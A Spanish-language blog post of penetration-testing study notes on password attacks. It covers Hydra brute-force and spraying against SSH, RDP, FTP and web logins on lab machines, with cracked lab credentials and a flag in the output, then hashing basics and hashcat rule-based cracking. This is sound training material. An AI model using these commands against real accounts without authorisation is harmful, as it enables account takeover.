---
layout: post
title: Password Attacks
subtitle: Password Attacks Basics.
tags: [pen]
---
En esta sección vamos a cubrir los siguientes temas:

- Attacking network services logins.
- Password Cracking Fundamentals.
- Working with passwords hashings.

<br />

### 21.1. Attacking Networks Services Login.

**SSH y RDP**

En esta sección vamos a ver cómo lanzar lo que se denomina como un ataque de lista de diccionario contra servicios de administración remota tanto de Linux (SSH) como de Windows (RDP) con la herramienta Hydra. El comando prototipo es el siguiente:

```
sudo hydra -L <wordlist> -P <wordlist> <protocol>://<IP>
```

Este comando utiliza una lista para nombres de usuario y contraseñas (-L y -P) respectivamente contra un servicio hosteado en una IP.

Un ejemplo sería:

```
sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
...
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:14344399/p:1), ~3586100 tries per task
[DATA] attacking rdp://192.168.50.202:3389/
...
[3389][rdp] host: 192.168.50.202   login: daniel   password: SuperS3cure1337#
[ERROR] freerdp: The connection failed to establish.
[3389][rdp] host: 192.168.50.202   login: justin   password: SuperS3cure1337#
[ERROR] freerdp: The connection failed to establish.
...
```

Observemos que las opciones -l y -p se utilizan para dar o un nombre de usuario o una contraseña en lugar de una lsita de candidatos.

Kali tiene disponible wordlists en /usr/share/wordlists.

<br />

**Exercises**

**1. Follow the steps outlined in this section to leverage a dictionary attack to get access to SSH (port 2222) on VM #1 (BRUTE). Find the flag in the george user's home directory.**

```
hydra 192.168.207.201 -l george -P /usr/share/wordlists/rockyou.txt ssh -s 2222
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-26 06:09:46
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.207.201:2222/
[2222][ssh] host: 192.168.207.201   login: george   password: chocolate
```

Con el comando anterior hemos realizado un ataque sobre SSH en el puerto 2222 con el nombre de usuario george y la lista de candidatos rockyou.txt.

<br />

**2.  Follow the steps outlined in this section to leverage a dictionary attack to gain access to RDP on VM #2 (BRUTE2). Find the flag on either one of the user's desktops. To reduce the time it takes to perform the password spraying, you can create a list with the two usernames _justin_ and _daniel_.**

```
hydra rdp://192.168.207.202 -L usernames.txt -p "SuperS3cure1337#" -t 20 -I
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-26 06:36:44
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:2/p:1), ~1 try per task
[DATA] attacking rdp://192.168.207.202:3389/
[3389][rdp] host: 192.168.207.202   login: justin   password: SuperS3cure1337#
[3389][rdp] host: 192.168.207.202   login: daniel   password: SuperS3cure1337#
```

<br />

**3. Enumerate VM #3 (BRUTE2) and find another network service. Use the knowledge from this section to get access as the _itadmin_ user and find the flag.**

```
 hydra ftp://192.168.207.202 -l itadmin -P /usr/share/wordlists/rockyou.txt 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-26 06:44:13
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://192.168.207.202:21/
[21][ftp] host: 192.168.207.202   login: itadmin   password: hellokitty
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-26 06:44:18
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ ftp itadmin@192.168.207.202       
Connected to 192.168.207.202.
220-FileZilla Server 1.4.1
220 Please visit https://filezilla-project.org/
331 Please, specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||53086|)
150 Starting data transfer.
-rw-rw-rw- 1 ftp ftp             282 Jun 09  2022 desktop.ini
-rw-rw-rw- 1 ftp ftp              38 Apr 26 10:39 flag.txt
226 Operation successful
ftp> more flag.txt
OS{ac433a169010f42c90113d0a68e6c253}

```

<br />

**HTTP POST Login Form**

Cuando tenemos un portal de logeo en una aplicación web 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230426133812.png' | relative_url }}" text-align="center"/>
</div>

Podemos realizar un ataque de lista de diccionario con Hydra a través del módulo HTTP-POST-FORM. Este, además de los parámetros habituales, consta de uno que se divide en tres partes, la página de logeo, los parámetros de la request y un mensaje característico de un intento de logeo fallido de la página web. Un ejempl sería:

```
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
...
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.50.201:80/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid username or password
```

El comando anterior manda las requests a la página /index.php, pasa en la reuqest POST los parámetros fm_user y fm_pass (observemos que el valor de aquel parámetro sobre el que se utiliza una lista de candidatos es '^PASS^' o '^USER^') y sabe si la petición de logeo ha sido exitosa cuando no detecta el string 'Login Invalid' en la respuesta.

Los dos primeros parámetros se pueden obtener o bien capturando una request en burpsuite o utilizando DevTools y acudiendo a la sección Network y revisando las distintas secciones de la request de logeo (cookies, parameter, etc):

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230426134625.png' | relative_url }}" text-align="center"/>
</div>

La segunda simplemente realizando un logeo de test y revisando la respuesta del navegador:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230426134654.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Exercises**

**1. Follow the steps from this section to gain access to TinyFileManager on VM #1 (BRUTE). Once logged in, find the flag.**

```
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.240.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-26 11:59:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.240.201:80/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid
[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:31h, 16 active
[80][http-post-form] host: 192.168.240.201   login: user   password: 121212
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-26 12:01:59
```

<br />

**2. The web page on VM #2 is password protected. Use Hydra to perform a password attack and get access as user admin. Once you have identified the correct password, enter it as answer to this exercise.**

Acudimos a la aplicación web y observamos que antes de que podamos acceder salta una ventana pidiendo credenciales:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230426181152.png' | relative_url }}" text-align="center"/>
</div>

Utilizamos el módulo http-get de hydra:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.240.201 http-get 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-26 12:05:35
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://192.168.240.201:80/
[80][http-get] host: 192.168.240.201   login: admin   password: 789456
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-26 12:05:48
```

<br />

### 21.2. Password Cracking Fundamentals.

#### 21.2.1 Encription vs Hash.

En esta sección, examinaremos las diferencias entre el *cifrado* y los *algoritmos hash* y analizaremos el crakeo de contraseñas. Luego, revisaremos dos herramientas populares para descifrar contraseñas: *Hashcat* y *John the Ripper* (JtR). Finalmente, calcularemos el tiempo que toma descifrar ciertos hashes.

Para comenzar, analicemos los conceptos básicos del cifrado. El cifrado es una función bidireccional, en la que los datos se "codifican" (cifran) o "descifran" (descifran) con al menos una clave. Los datos cifrados se conocen como *texto cifrado* o *cipher text*.

Los algoritmos de cifrado *simétrico* utilizan la misma clave tanto para el cifrado como para el descifrado. Para enviar un mensaje a otra persona, ambas partes deben conocer la clave (contraseña). Si intercambian la clave a través de un canal no seguro, un atacante puede interceptarla. Además, el atacante puede usar un ataque *Man-in-the-middle* para obtener acceso a los mensajes cifrados enviados entre los socios de comunicación. Tanto con la clave interceptada como con el acceso a los mensajes cifrados, el atacante puede descifrarlos y leerlos. Esto crea un gran riesgo de seguridad ya que toda la seguridad de la comunicación se basa en el conocimiento de una clave, que ambas partes deben conocer antes de iniciar la comunicación. El estándar de cifrado avanzado (AES) es un ejemplo de un algoritmo de cifrado simétrico.

El cifrado *asimétrico* utiliza pares de claves distintas que contienen claves públicas y privadas. Cada usuario en esta transacción tiene su propio par de claves. Para recibir un mensaje cifrado, un usuario proporciona su clave pública al socio de comunicación, que utiliza para cifrar su mensaje para nosotros. Cuando se envía el mensaje, solo la clave privada correspondiente puede descifrar el mensaje. Un algoritmo de cifrado asimétrico común es Rivest-Shamir-Adleman (RSA).

Por otro lado, un hash (o resumen) es el resultado de ejecutar datos de entrada de tamaño variable (en este caso, una contraseña de texto sin formato) a través de un algoritmo hash (como SHA1 o MD5 12).

El resultado es un valor hexadecimal de longitud fija prácticamente único que representa el texto sin formato original. En otras palabras, el texto sin formato que se ejecuta a través de un algoritmo hash específico siempre produce el mismo hash y el hash resultante es (estadísticamente) único. La única excepción a esto es la extremadamente rara *colisión* en la que dos valores de entrada dan como resultado el mismo valor de hash. La principal diferencia por tanto entre la codificación/cifrado y el hash es que en la codificación los datos están completos, integros, pero transformados de forma que resultan ilegibles

La mayoría de los algoritmos hash de uso común, como MD5 y SHA1, son *funciones hash criptográficas*. Estos algoritmos hash son *funciones unidireccionales*, lo que significa que es trivial generar un hash, pero la implementación adecuada de un algoritmo hace prohibitivamente difícil obtener el texto sin formato del hash. Para este módulo, analizaremos las funciones hash criptográficas a menos que se indique lo contrario.

El hashing a menudo se aprovecha en el campo de la seguridad de la información. Por ejemplo, si un usuario registra una cuenta a través de una aplicación, establece una contraseña. La contraseña a menudo se hashea y se almacena en una base de datos para que los administradores del sitio (y los atacantes) no puedan acceder a la contraseña de texto sin formato.

Cuando se realiza un intento de inicio de sesión, la contraseña ingresada se convierte en hash y ese hash se compara con el valor hash en la base de datos. Si coinciden, la contraseña ingresada es correcta y el usuario inicia sesión.

Dentro del alcance de los ataques de contraseña, las contraseñas de aplicaciones y usuarios a menudo se cifran o se cifran para protegerlas.

Para descifrar una contraseña cifrada debemos determinar la clave utilizada para cifrarla. Para determinar el texto sin formato de una contraseña con hash, debemos ejecutar varias contraseñas de texto sin formato a través del algoritmo hash y comparar el hash devuelto con el hash de destino. Estos ataques se conocen colectivamente como *password cracking* y, a menudo, se realizan en un sistema dedicado. Dado que el proceso puede llevar una cantidad de tiempo considerable, a menudo lo ejecutamos en paralelo con otras actividades durante una prueba de penetración.

A diferencia de los ataques de diccionario básicos contra los servicios de red y los formularios de inicio de sesión que se demostraron en la Unidad de aprendizaje anterior, el descifrado de contraseñas conserva el ancho de banda de la red, no bloquea las cuentas y no se ve afectado por las tecnologías defensivas tradicionales.

Podemos realizar un descifrado básico de contraseñas con un ejemplo simple. Supongamos que obtuvimos acceso a un hash de contraseña SHA-256 de 5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6_ . Hay varias formas en que podríamos haber obtenido acceso a este hash, pero de cualquier manera podemos usar **sha256sum** para codificar varias contraseñas y examinar los resultados. En este caso, haremos hash de la cadena "secret", luego haremos hash de "secret" nuevamente y finalmente haremos hash de la cadena "secret1". Usaremos **echo -n** para eliminar la nueva línea de nuestra cadena (que se habría agregado a nuestra cadena, modificando el hash).

```
kali@kali:~$ echo -n "secret" | sha256sum
2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b  -

kali@kali:~$ echo -n "secret" | sha256sum
2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b  -

kali@kali:~$ echo -n "secret1" | sha256sum
5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6  -
```

En este ejemplo, aplicamos el hash "secreto" dos veces para mostrar que el hash de salida resultante es siempre el mismo. Tenga en cuenta que los valores hash para "secreto" y "secreto1" son completamente diferentes aunque las cadenas de entrada sean similares. También tenga en cuenta que el hash de "secret1" coincide con nuestro hash capturado. Esto significa que hemos determinado la contraseña de texto sin formato ("secret1") asociada con ese hash. 

Sin embargo, esta es una forma muy simple e incómoda de descifrar hashes de contraseñas. Afortunadamente, hay herramientas mucho mejores disponibles. Hashcat y John the Ripper (JtR) son dos de las herramientas más populares para descifrar contraseñas. En general, JtR es más una herramienta de craqueo basada en CPU, que también admite GPU, mientras que Hashcat es principalmente una herramienta de craqueo basada en GPU que también admite CPU. JtR se puede ejecutar sin ningún controlador adicional usando solo CPU para descifrar contraseñas. Hashcat requiere *OpenCL* o *CUDA* para el proceso de craqueo de GPU. Para la mayoría de los algoritmos, una GPU es mucho más rápida que una CPU, ya que las GPU modernas contienen miles de núcleos, cada uno de los cuales puede compartir parte de la carga de trabajo. Sin embargo, algunos algoritmos hash lentos (como *bcrypt*) funcionan mejor en las CPU.

Es importante familiarizarse con diferentes herramientas ya que no admiten los mismos algoritmos. Examinaremos ambas herramientas en este Módulo.

Antes de comenzar a descifrar contraseñas, calculemos el tiempo de descifrado de varias representaciones hash. El tiempo de craqueo se puede calcular dividiendo el *keyspace* con la tasa de hash.

El keyspace consta del conjunto de caracteres posibles elevado a la potencia de la cantidad de caracteres o la longitud de la información original (contraseña). Por ejemplo, si usamos el alfabeto latino en minúsculas (26 caracteres), el alfabeto en mayúsculas (26 caracteres) y los números del 0 al 9 (10 caracteres), tenemos un conjunto de caracteres de 62 variaciones posibles para cada carácter. Si nos encontramos ante una contraseña de cinco caracteres, nos encontramos ante 62 elevado a cinco posibles contraseñas que contengan estos cinco caracteres.

Dado que es importante poder calcular esto, usemos una terminal para calcular el espacio de claves para una contraseña de cinco caracteres haciendo eco de nuestro conjunto de caracteres a wc con -c para contar cada carácter. Nuevamente especificaremos -n para que el comando echo elimine el carácter de nueva línea. Luego podemos usar _python3_ para el cálculo, con -c para ejecutar el cálculo e imprimir para mostrar el resultado.

```
kali@kali:~$ echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
62

kali@kali:~$ python3 -c "print(62**5)"
916132832
```

Para una contraseña de cinco caracteres y el conjunto de caracteres especificado, tenemos un espacio de claves de 916.132.832. Este número determina cuántas variaciones únicas se pueden generar para una contraseña de cinco caracteres con este juego de caracteres. Ahora que tenemos el espacio de claves en el contexto de este ejemplo, también necesitamos la tasa de hash para calcular el tiempo de craqueo. La tasa de hash es una medida de cuántos cálculos de hash se pueden realizar en un segundo.

Para encontrar la tasa de hash, podemos usar el modo de referencia de Hashcat para determinar las tasas de hash para varios algoritmos de hash en nuestro hardware particular.

Usaremos **hashcat** con -b para iniciar el "benchmark mode". Primero, compararemos una CPU ejecutándola en una máquina virtual Kali sin ninguna GPU conectada. Siguiendo un sistema Kali local, los resultados pueden diferir.

```
kali@kali:~$ hashcat -b
hashcat (v6.2.5) starting in benchmark mode
...
* Device #1: pthread-Intel(R) Core(TM) i9-10885H CPU @ 2.40GHz, 1545/3154 MB (512 MB allocatable), 4MCU

Benchmark relevant options:
===========================
* --optimized-kernel-enable

-------------------
* Hash-Mode 0 (MD5)
-------------------

Speed.#1.........:   450.8 MH/s (2.19ms) @ Accel:256 Loops:1024 Thr:1 Vec:8

----------------------
* Hash-Mode 100 (SHA1)
----------------------

Speed.#1.........:   298.3 MH/s (3.22ms) @ Accel:256 Loops:1024 Thr:1 Vec:8

---------------------------
* Hash-Mode 1400 (SHA2-256)
---------------------------

Speed.#1.........:   134.2 MH/s (7.63ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
```

El benchmark mode muestra tasas de hash para todos los modos compatibles de Hashcat. La lista anterior está abreviada, ya que Hashcat admite muchos algoritmos hash. Por ahora, solo estamos interesados ​​en MD5, SHA1 y SHA-256. Los valores de las tasas de hash están en MH/s, en los que 1 MH/s equivale a 1 000 000 de hash por segundo. Tenga en cuenta que los resultados variarán en diferentes hardware. Anotemos las tasas de hash que se muestran en el punto de referencia de la CPU en este Listado y ejecutemos un punto de referencia de la GPU para que podamos comparar los resultados.

Para el siguiente punto de referencia, usaremos un sistema diferente con una GPU adjunta. Nuevamente, usaremos el modo de referencia de Hashcat para calcular las tasas de hash para MD5, SHA1 y SHA-256.

No se puede ejecutar una prueba comparativa de GPU en el laboratorio.

```
C:\Users\admin\Downloads\hashcat-6.2.5>hashcat.exe -b
hashcat (v6.2.5) starting in benchmark mode
...
* Device #1: NVIDIA GeForce RTX 3090, 23336/24575 MB, 82MCU

Benchmark relevant options:
===========================
* --optimized-kernel-enable

-------------------
* Hash-Mode 0 (MD5)
-------------------

Speed.#1.........: 68185.1 MH/s (39.99ms) @ Accel:256 Loops:1024 Thr:128 Vec:8

----------------------
* Hash-Mode 100 (SHA1)
----------------------

Speed.#1.........: 21528.2 MH/s (63.45ms) @ Accel:64 Loops:512 Thr:512 Vec:1

---------------------------
* Hash-Mode 1400 (SHA2-256)
---------------------------

Speed.#1.........:  9276.3 MH/s (73.85ms) @ Accel:16 Loops:1024 Thr:512 Vec:1
```

<br />

#### 21.2.2. Mutating Wordlists.

Las políticas de contraseñas, cuya prevalencia ha aumentado en los últimos años, dictan una longitud mínima de contraseña y el uso de derivaciones de caracteres, incluidas letras mayúsculas y minúsculas, caracteres especiales y valores numéricos.

La mayoría de las contraseñas en las listas de palabras de uso común no cumplirán estos requisitos. Si quisiéramos usarlos contra un objetivo con políticas de contraseñas seguras, tendríamos que preparar manualmente la lista de palabras eliminando todas las contraseñas que no cumplan con la política de contraseñas o modificando manualmente la lista de palabras para incluir las contraseñas adecuadas. Podemos abordar esto automatizando el proceso de cambiar (o *mutar*) nuestra lista de palabras antes de enviarlas a este objetivo en lo que se conoce como un *ataque basado en reglas* (Rule-based attacks). En este tipo de ataque, las reglas individuales se implementan a través de funciones de reglas, que se utilizan para modificar contraseñas existentes contenidas en una lista de palabras. Una regla individual consta de una o más funciones de regla. A menudo usaremos varias funciones de regla en cada regla.

Para aprovechar un ataque basado en reglas, crearemos un archivo de reglas que contenga una o más reglas y lo usaremos con una herramienta de craqueo.

En un ejemplo simple, podríamos crear una función de regla que agregue caracteres fijos a todas las contraseñas en una lista de palabras o modifique varios caracteres en una contraseña.

Tenga en cuenta que los ataques basados ​​en reglas aumentan enormemente la cantidad de intentos de contraseñas, aunque ahora sabemos que el hardware moderno puede manejar fácilmente contraseñas comunes con menos de ocho caracteres.

Para el siguiente ejemplo, supondremos que nos enfrentamos a una política de contraseñas que requiere una letra mayúscula, un carácter especial y un valor numérico. Revisemos las primeras 10 contraseñas de **rockyou.txt** para determinar si cumplen con este requisito. Usaremos el comando **head** para mostrar las primeras 10 líneas de la lista de palabras.

```
kali@kali:~$ head /usr/share/wordlists/rockyou.txt 
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
```

La lista muestra que ninguna de las primeras diez contraseñas de **rockyou.txt** cumple con los requisitos de la política de contraseñas de este ejemplo.

Ahora podríamos usar funciones de reglas para mutar la lista de palabras para que se ajuste a la política de contraseñas. Pero antes de mutar una lista de palabras compleja como **rockyou.txt** , primero familiaricémonos con las funciones de las reglas y cómo usarlas con un ejemplo más básico.

Para demostrar las funciones de las reglas, como el uso de mayúsculas, copiemos las 10 contraseñas del Listado 12 y guárdelas en **demo.txt** en el directorio **passwordattacks** recién creado . Luego, eliminaremos todas las secuencias numéricas (que no se ajustan a la política de contraseñas) de **demo.txt** usando **sed** con **^1** refiriéndose a todas las líneas que comienzan con "1", eliminándolas con **d** y editando en lugar con **-i** .

```
kali@kali:~$ mkdir passwordattacks

kali@kali:~$ cd passwordattacks

kali@kali:~/passwordattacks$ head /usr/share/wordlists/rockyou.txt > demo.txt

kali@kali:~/passwordattacks$ sed -i '/^1/d' demo.txt 

kali@kali:~/passwordattacks$ cat demo.txt
password
iloveyou
princess
rockyou
abc123
```

Ahora tenemos cinco contraseñas en nuestra lista de palabras **demo.txt** . Modifiquemos estas contraseñas para que se ajusten a la política de contraseñas, que debe incluir un valor numérico, un carácter especial y una letra mayúscula.

[Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=rule_based_attack) proporciona una lista de todas las posibles funciones de reglas con ejemplos. Si queremos agregar un carácter, la forma más simple es anteponerlo o agregarlo. Podemos usar la función **$** para agregar un carácter o **^** para anteponer un carácter. Ambas funciones esperan un carácter después del selector de funciones. Por ejemplo, si queremos anteponer un "3" a cada contraseña en un archivo, la función de regla correspondiente sería **^3** .

Al generar una contraseña con un valor numérico, muchos usuarios simplemente agregan un "1" al final de una contraseña existente. Por lo tanto, creemos un archivo de reglas que contenga **\$1** para agregar un "1" a todas las contraseñas en nuestra lista de palabras. Crearemos una **demo.rule** con esta función de regla. Necesitamos escapar del carácter especial "\$" para repetirlo en el archivo correctamente.

```
kali@kali:~/passwordattacks$ echo \$1 > demo.rule
```

Ahora, podemos usar **hashcat** con nuestra mutación de lista de palabras, proporcionando el archivo de reglas con **-r** y **--stdout** , que inicia Hashcat en modo de depuración. En este modo, Hashcat no intentará descifrar ningún hash, sino que simplemente mostrará las contraseñas mutadas.

```
kali@kali:~/passwordattacks$ hashcat -r demo.rule --stdout demo.txt
password1
iloveyou1
princess1
rockyou1
abc1231
```

La lista muestra que se agregó un "1" a cada contraseña debido a la función de regla **$1** .

Ahora, abordemos el carácter en mayúsculas de la política de contraseñas. Cuando se les obliga a usar un carácter en mayúsculas en una contraseña, muchos usuarios tienden a escribir en mayúscula el primer carácter. Por lo tanto, agregaremos la función de regla **c** a nuestro archivo de reglas, que pone en mayúscula el primer carácter y convierte el resto en minúsculas.

Probemos un ejemplo usando dos archivos de reglas: **demo1.rule** y **demo2.rule** . Formatearemos estos archivos de manera diferente.

En **demo1.rule** , las funciones de regla están en la misma línea separadas por un espacio. En este caso, Hashcat las usará consecutivamente en cada contraseña de la lista de palabras. El resultado es que el primer carácter de cada contraseña está en mayúscula Y se agrega un "1" a cada contraseña.

En **demo2.rule,** las funciones de la regla están en líneas separadas. Hashcat interpreta la función de la segunda regla, en la segunda línea, como nueva regla. En este caso, cada regla se usa por separado, lo que da como resultado dos contraseñas mutadas para cada contraseña de la lista de palabras.

```
kali@kali:~/passwordattacks$ cat demo1.rule     
$1 c
       
kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
Password1
Iloveyou1
Princess1
Rockyou1
Abc1231

kali@kali:~/passwordattacks$ cat demo2.rule   
$1
c

kali@kali:~/passwordattacks$ hashcat -r demo2.rule --stdout demo.txt
password1
Password
iloveyou1
Iloveyou
princess1
Princess
...
```

¡Bien! Hemos adaptado el archivo de reglas **demo1.rule** a dos de las tres políticas de contraseñas. Trabajemos en el tercero y agreguemos un carácter especial. Comenzaremos con "!", que es un carácter especial muy común.

Con base en esta suposición, ¡agregaremos **\$!** a nuestro archivo de reglas. Dado que queremos que todas las funciones de reglas se apliquen a cada contraseña, debemos especificar las funciones en la misma línea. Nuevamente, demostraremos esto con dos archivos de reglas diferentes para enfatizar el concepto de combinar funciones de reglas. En el primer archivo de reglas agregaremos **\$!** hasta el final de la primera regla. En el segundo archivo de reglas, lo agregaremos al principio de la regla.

```
kali@kali:~/passwordattacks$ cat demo1.rule     
$1 c $!

kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
Password1!
Iloveyou1!
Princess1!
Rockyou1!
Abc1231!

kali@kali:~/passwordattacks$ cat demo2.rule   
$! $1 c

kali@kali:~/passwordattacks$ hashcat -r demo2.rule --stdout demo.txt
Password!1
Iloveyou!1
Princess!1
Rockyou!1
Abc123!1
```

El resultado muestra que **demo1.rule** muta las contraseñas agregando primero el "1" y luego "!". El otro archivo de reglas, **demo2.rule** , agrega "!" primero y luego el "1". Esto nos muestra que las funciones de regla se aplican de izquierda a derecha en una regla.

La regla contenida en **demo1.rule** muta las contraseñas de nuestra lista de palabras para cumplir con los requisitos de la política de contraseñas.

Ahora que tenemos una comprensión básica de las reglas y cómo crearlas, descifremos un hash con un ataque basado en reglas. En esta demostración, supongamos que recuperamos el hash MD5 "f621b6c9eab51a3e2f4e167fee4c6860" de un sistema de destino. Usaremos la lista de palabras **rockyou.txt** y la modificaremos para una política de contraseñas que requiera una letra mayúscula, un valor numérico y un carácter especial.

Vamos a crear un archivo de reglas para abordar esta política de contraseñas. Como antes, usaremos la función de la regla **c** para las mayúsculas de la primera letra. Además, también usamos "!" de nuevo como carácter especial. Para los valores numéricos agregaremos el (siempre popular) "1", "2" y "123" seguidos del carácter especial.

```
kali@kali:~/passwordattacks$ cat crackme.txt     
f621b6c9eab51a3e2f4e167fee4c6860

kali@kali:~/passwordattacks$ cat demo3.rule   
$1 c $!
$2 c $!
$1 $2 $3 c $!
```

A continuación, podemos ejecutar Hashcat. Deshabilitaremos la depuración eliminando el argumento **--stdout .** En su lugar, especificaremos **-m** , que establece el tipo de hash. En esta demostración, queremos descifrar MD5, que es el tipo de hash **0** , que recuperamos de la página de ejemplos de hash de Hashcat. Después del tipo hash, proporcionaremos el archivo hash MD5 de destino ( **crackme.txt** ) y la lista de palabras **rockyou.txt** . Luego, especificaremos **-r** para proporcionar nuestra **demo3.rule** . Como nuestra máquina virtual Kali no tiene acceso a una GPU, también ingresaremos **--force** para ignorar las advertencias relacionadas de Hashcat.

```
kali@kali:~/passwordattacks$ hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
hashcat (v6.2.5) starting
...
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 43033155

f621b6c9eab51a3e2f4e167fee4c6860:Computer123!            
                                                          
Session..........: hashca
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: f621b6c9eab51a3e2f4e167fee4c6860
Time.Started.....: Tue May 24 14:34:54 2022, (0 secs)
Time.Estimated...: Tue May 24 14:34:54 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (demo3.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3144.1 kH/s (0.28ms) @ Accel:256 Loops:3 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
...
```

En este caso, desciframos el "Computer123!" contraseña, que no estaba incluida en el archivo **rockyou.txt** predeterminado . Esto solo tomó a Hashcat unos segundos a pesar de ejecutarse en la CPU.

Al intentar crear reglas para mutar una lista de palabras existente, siempre debemos considerar el comportamiento humano y la conveniencia con respecto a las contraseñas. La mayoría de los usuarios usan una palabra principal y la modifican para que se ajuste a una política de contraseñas, tal vez agregando números y caracteres especiales. Cuando se requiere una letra mayúscula, la mayoría de los usuarios escriben en mayúscula la primera letra. Cuando se requieren caracteres especiales, la mayoría de los usuarios agregan el carácter especial al final de la contraseña y confían en los caracteres del lado izquierdo del teclado, ya que estos dígitos son fáciles de alcanzar y escribir.

En lugar de crear reglas nosotros mismos, también podemos usar reglas proporcionadas por Hashcat u otras fuentes. Hashcat incluye una variedad de reglas efectivas en */usr/share/hashcat/rules*:

```
kali@kali:~/passwordattacks$ ls -la /usr/share/hashcat/rules/
total 2588
-rw-r--r-- 1 root root    933 Dec 23 08:53 best64.rule
-rw-r--r-- 1 root root    666 Dec 23 08:53 combinator.rule
-rw-r--r-- 1 root root 200188 Dec 23 08:53 d3ad0ne.rule
-rw-r--r-- 1 root root 788063 Dec 23 08:53 dive.rule
-rw-r--r-- 1 root root 483425 Dec 23 08:53 generated2.rule
-rw-r--r-- 1 root root  78068 Dec 23 08:53 generated.rule
drwxr-xr-x 2 root root   4096 Feb 11 01:58 hybrid
-rw-r--r-- 1 root root 309439 Dec 23 08:53 Incisive-leetspeak.rule
-rw-r--r-- 1 root root  35280 Dec 23 08:53 InsidePro-HashManager.rule
-rw-r--r-- 1 root root  19478 Dec 23 08:53 InsidePro-PasswordsPro.rule
-rw-r--r-- 1 root root    298 Dec 23 08:53 leetspeak.rule
-rw-r--r-- 1 root root   1280 Dec 23 08:53 oscommerce.rule
